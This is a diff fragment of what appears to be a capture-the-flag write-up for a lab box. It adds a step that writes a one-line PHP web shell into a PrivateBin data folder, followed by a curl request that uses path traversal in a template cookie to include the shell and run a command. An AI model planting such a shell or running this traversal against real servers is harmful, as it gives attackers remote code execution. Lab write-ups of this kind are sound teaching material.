@@ -248,6 +248,14 @@ drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
 ```
 
 ```
+ben@kobold:/privatebin-data/data/bd/b5$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
+```
+
+IMAGE 4
+
+curl alternative:
+
+```
  curl -k https://bin.kobold.htb/ \                    
   -b "template=../data/bd/b5/shell" \
   -G --data-urlencode "cmd=id"
